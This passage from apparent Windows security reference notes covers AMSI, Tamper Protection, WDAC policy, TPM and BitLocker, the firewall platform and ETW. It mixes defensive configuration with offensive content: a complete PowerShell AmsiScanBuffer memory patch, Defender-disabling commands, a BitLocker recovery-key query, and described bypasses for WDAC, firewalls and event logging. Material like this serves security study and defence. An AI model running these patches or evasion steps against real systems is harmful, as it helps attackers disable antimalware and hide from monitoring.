1.3 AMSI (Antimalware Scan Interface)

Architecture

AMSI is a COM-based interface that allows applications to request content scanning from registered AV providers. The scan flow:

  1. Application (e.g., PowerShell) calls AmsiScanBuffer() or AmsiScanString()
  2. AMSI DLL (amsi.dll) loaded into the process forwards the buffer
  3. Registered AMSI provider (e.g., Defender) evaluates the content
  4. Returns AMSI_RESULT: Clean, NotDetected, BlockedByAdmin, or Detected (1–32767 severity)

Key AMSI providers: Microsoft Defender AV, third-party AVs, custom providers via IAntimalwareProvider COM interface.

AMSI-aware applications: PowerShell (v5+), VBScript, JScript, .NET (4.8+), Office VBA macros, Windows Script Host, JavaScript via wscript/cscript.

AMSI Bypass Techniques

1. Memory Patching AmsiScanBuffer

Patch the AmsiScanBuffer function in memory to always return AMSI_RESULT_CLEAN. The function prologue is overwritten with a ret instruction or forced to return 0x80070057 (E_INVALIDARG).

# Classic AmsiScanBuffer patch (educational — signatures exist for this)
$win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $win32
$amsiDll = [Win32]::LoadLibrary("amsi.dll")
$amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($amsiScanBuffer, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, 6)

1.5 Tamper Protection

Tamper Protection prevents unauthorized changes to Defender settings. When enabled:

  • Cannot disable real-time protection via registry/GPO/PowerShell
  • Cannot modify exclusions without proper authorization
  • Cannot stop/disable the Defender service
  • Cannot uninstall Defender components
  • Managed via Microsoft 365 Defender portal (cloud-managed)
# Check Tamper Protection status
Get-MpComputerStatus | Select-Object IsTamperProtected

# These commands FAIL when Tamper Protection is ON:
Set-MpPreference -DisableRealtimeMonitoring $true  # Blocked
sc stop WinDefend                                    # Blocked
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1  # Blocked

3.2 Policy Creation

# Create a base policy from a reference system (gold image)
New-CIPolicy -Level Publisher -FilePath "C:\Policies\BasePolicy.xml" -UserPEs -Fallback Hash

# Trust levels (from most to least specific):
# Hash → FileName → FilePublisher → LeafCertificate → PcaCertificate → Publisher

# Create policy allowing all Microsoft-signed binaries
New-CIPolicy -Level Publisher -FilePath "C:\Policies\MicrosoftOnly.xml" -UserPEs

# Merge supplemental policy
Merge-CIPolicy -PolicyPaths "C:\Policies\BasePolicy.xml","C:\Policies\Supplemental.xml" -OutputFilePath "C:\Policies\Merged.xml"

# Convert XML to binary (.p7b) for deployment
ConvertFrom-CIPolicy "C:\Policies\BasePolicy.xml" "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"

# Set policy to audit mode first
Set-RuleOption -FilePath "C:\Policies\BasePolicy.xml" -Option 3  # Audit Mode

# Remove audit mode (enforce)
Set-RuleOption -FilePath "C:\Policies\BasePolicy.xml" -Option 3 -Delete

3.3 Trust Levels Hierarchy

  1. Hash — Exact file hash (most restrictive, breaks on updates)
  2. FileName — Original filename from PE header + minimum version
  3. FilePublisher — Publisher + product + filename + version
  4. LeafCertificate — Specific signing certificate
  5. PcaCertificate — Certificate Authority that issued the signing cert
  6. Publisher — Any binary signed by a given publisher

3.4 Managed Installer

Managed Installer allows WDAC to trust binaries deployed by authorized software distribution systems (SCCM/MEMCM, Intune). Anything installed by the managed installer is automatically trusted.

# Configure managed installer (SCCM example)
# The AppLocker policy must tag ccmexec.exe as a managed installer
# Then WDAC will trust anything it deploys

# Check managed installer status
Get-CIPolicy -FilePath "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b" | Select-Object -ExpandProperty Rules

3.5 WDAC Bypass Techniques

  • LOLBins in default policy: Some Microsoft-signed binaries can execute arbitrary code and may be allowed by default WDAC policies (MSBuild, PowerShell in constrained language mode bypass)
  • Unsigned catalog abuse: If catalog signing is trusted, inject into unsigned catalog
  • WDAC policy tampering: In audit mode, nothing is blocked — attackers may attempt to switch policy to audit
  • Managed installer abuse: Compromise the software distribution system to deploy malicious payloads as "managed"
  • Vulnerable driver loading: Bring Your Own Vulnerable Driver (BYOVD) — load a signed but vulnerable driver to disable WDAC from kernel

4.2 TPM (Trusted Platform Module)

Platform Configuration Registers (PCRs)

PCRMeasures
0BIOS/UEFI firmware code
1BIOS/UEFI firmware configuration
2Option ROMs
3Option ROM configuration
4MBR / boot manager code
5MBR / boot manager configuration
6State transitions / wake events
7Secure Boot state (UEFI variables, certificates)
8-10OS-specific (kernel, drivers)
11BitLocker access control
12-15Available for OS/applications

Sealing & Unsealing

  • Sealing: TPM encrypts data bound to specific PCR values — data can only be decrypted when system is in the same measured state
  • Unsealing: TPM releases the sealed key only if current PCR values match the sealed state
  • BitLocker seals the Volume Master Key (VMK) to PCRs 0, 2, 4, 7, 11

4.3 BitLocker Attack Surface

Recovery Key Attacks

# Recovery keys stored in:
# - Active Directory (AD DS): stored as attribute on computer object
# - Azure AD / Entra ID: accessible via portal
# - File: saved to USB/network share during setup
# - Printed: physical copy

# Query AD for recovery keys (requires appropriate permissions)
Get-ADObject -Filter {objectclass -eq 'msFVE-RecoveryInformation'} -SearchBase "CN=WORKSTATION01,OU=Computers,DC=corp,DC=local" -Properties msFVE-RecoveryPassword

DMA Attacks

Direct Memory Access attacks via Thunderbolt/PCIe can read encryption keys from RAM if TPM-only mode is used (no PIN):

  • PCILeech: FPGA-based DMA attack tool — reads physical memory via Thunderbolt/PCIe
  • Inception: DMA-based attack tool for key extraction
  • Mitigation: Enable TPM+PIN, enable Kernel DMA Protection (VBS-based), disable Thunderbolt in BIOS

Cold Boot Attack

RAM retains data briefly after power loss (DRAM remanence). Spray canned air to cool RAM chips, then:

  1. Force reboot into custom OS (or transplant RAM to another machine)
  2. Dump physical memory before encryption keys decay
  3. Extract AES keys from the memory dump

TPM Bus Sniffing

For discrete TPM chips (not fTPM), the communication between TPM and CPU travels over an SPI or LPC bus. An attacker with physical access can:

  1. Attach logic analyzer probes to TPM SPI/LPC bus pins
  2. Trigger a normal boot (TPM-only mode)
  3. Capture the VMK as it's transmitted from TPM to CPU
  4. Use captured VMK to decrypt the drive offline

Tools: Saleae Logic, PicoScope + custom scripts, dedicated TPM sniffing hardware.

Mitigation: Use TPM+PIN (VMK is sealed to PIN hash — sniffed key alone is insufficient), use fTPM (firmware TPM integrated into CPU — no external bus).

5.5 WFP (Windows Filtering Platform) Architecture

WFP is the underlying framework that Windows Firewall builds upon. It operates at multiple layers:

  • Application Layer Enforcement (ALE): Controls connection setup (bind, connect, listen, accept)
  • Transport Layer: Filters TCP/UDP packets
  • Network Layer: IP-level filtering
  • FWPM (Filter Platform Management): User-mode API for managing filters
  • Callout Drivers: Kernel-mode modules for deep packet inspection (used by EDR, AV)
# View WFP filters (requires admin)
netsh wfp show filters

# Capture WFP state for diagnostics
netsh wfp capture start
# ... reproduce issue ...
netsh wfp capture stop

# View WFP state
netsh wfp show state

5.6 Firewall Bypass Techniques

  • Allowed program abuse: Inject shellcode into a process that has firewall exceptions (e.g., svchost.exe, explorer.exe)
  • Port reuse: Bind to an already-open port (e.g., 80, 443) using SO_REUSEADDR — traffic piggybacks on allowed rules
  • DNS/HTTPS tunneling: Exfiltrate data over DNS (port 53) or HTTPS (port 443) — typically always allowed outbound
  • ICMP tunneling: Embed data in ICMP echo requests (ping) — often not filtered
  • Named pipe pivoting: Use SMB named pipes over port 445 (often open in domain environments)
  • Reverse connections: Outbound connections are typically less restricted — use reverse shells instead of bind shells

6.3 ETW (Event Tracing for Windows)

Architecture

  • Providers: Components that emit events (kernel, user-mode services, applications). Identified by GUID.
  • Sessions (Controllers): Collect events from providers and write to buffers/files. Managed by StartTrace() / ControlTrace().
  • Consumers: Process/display events from sessions (ETW realtime, .etl files).

ETW Threat Intelligence Provider

The Microsoft-Windows-Threat-Intelligence provider is a kernel-mode ETW provider that emits events for:

  • Virtual memory allocation (RWX pages) — detects shellcode injection
  • Memory protection changes (VirtualProtect to executable)
  • Process hollowing / module stomping patterns
  • Map view of sections with execute permission

Note: Only PPL (Protected Process Light) processes can consume events from this provider — this is how Defender/EDR gets privileged telemetry.

Phantom Event Log (Thread Killing)

The Event Log service (svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog) uses multiple threads for logging. Kill logging threads without killing the service:

  1. Identify the Event Log service process and its threads
  2. Enumerate threads responsible for writing events
  3. Suspend/terminate those threads — service appears running but no events are written
  4. Events generated during this window are permanently lost

Minifilter Altitude Manipulation

Sysmon registers as a minifilter driver at a specific altitude (385201 by default). Attackers can:

  • Register a higher-altitude minifilter that intercepts and blocks events before Sysmon sees them
  • Modify the Sysmon minifilter's altitude in registry to a lower value (less visibility)
# View minifilter altitudes

# Registry location for minifilter altitude:
# HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Instances\Sysmon Instance\Altitude
